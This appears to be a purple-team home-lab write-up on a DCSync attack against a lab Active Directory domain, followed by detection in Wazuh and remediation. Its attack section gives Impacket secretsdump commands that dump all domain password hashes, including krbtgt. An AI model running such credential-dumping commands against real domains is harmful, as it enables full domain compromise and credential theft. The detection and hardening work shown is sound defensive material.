# Project 03 — DCSync (T1003.006)

Abuse the replication rights wrongly granted to `b.otieno` (misconfig #3) to pull
password hashes for the entire domain — including `krbtgt` — then detect it.

---

## 1. Scenario
DCSync impersonates a Domain Controller and asks a real DC to **replicate** account
secrets. It only requires two extended rights on the domain object:
`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`. Misconfig #3 handed
those rights to `b.otieno`, a Tier-2 helpdesk account — so a low-tier user can extract
every hash in the domain. Pulling the `krbtgt` hash enables **Golden Ticket** forging
= effectively permanent domain compromise. Over-delegating replication rights is a
classic "convenience gone catastrophic" finding.

**Phase:** Red — power on **KALI01 + DC01**. (You need `b.otieno`'s creds first —
recover them via Project 02, or use the lab password.)

## 2. Attack (from KALI01)
```bash
# Impacket secretsdump performing DCSync as the over-permissioned helpdesk user.
impacket-secretsdump lab.local/b.otieno@10.10.10.10 -just-dc
# -just-dc pulls NTDS (all domain hashes) via replication.
```
Target just the crown jewels:
```bash
impacket-secretsdump lab.local/b.otieno@10.10.10.10 -just-dc-user krbtgt
```
Expected: NTLM hashes for domain accounts, including `Administrator` and `krbtgt`.

> **What I proved:** a helpdesk-tier account escalated to **full domain compromise**
> purely through an over-permissioned ACL — no exploit, just misused rights.

## 3. Telemetry this generates
On DC01: **Event ID 4662** (operation on an AD object) referencing the replication
control-access-right GUIDs:
- `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes)
- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes-All)
performed by a principal that is **not** a Domain Controller — the DCSync signature.

## 4. Detection (in Wazuh — blue phase)
```
data.win.system.eventID:4662 AND data.win.eventdata.properties:(*1131f6aa* OR *1131f6ad*)
```
Custom rule `100012` in
[`../../wazuh/custom-rules/local_rules.xml`](../../wazuh/custom-rules/local_rules.xml)
— fires when a non-DC account exercises replication rights.

## 5. Remediation
- **Remove replication rights** from anything that isn't a DC or a sanctioned sync
  service. Audit the domain-root ACL for `Get-Changes*` grants.
  ```powershell
  # Review who holds replication rights:
  (Get-Acl "AD:$((Get-ADDomain).DistinguishedName)").Access |
    Where-Object { $_.ObjectType -in '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' }
  ```
- Enforce Tiered Administration so helpdesk accounts can never hold domain-level rights.
- Alert on 4662 replication from non-DC hosts (rule above).
- If `krbtgt` was exposed, **rotate the krbtgt password twice**.

## 6. Evidence
- 📸 `secretsdump` dumping domain hashes (redact real-looking values)
- 📸 the `krbtgt` hash line
- 📸 Wazuh alert (rule 100012) for the replication 4662
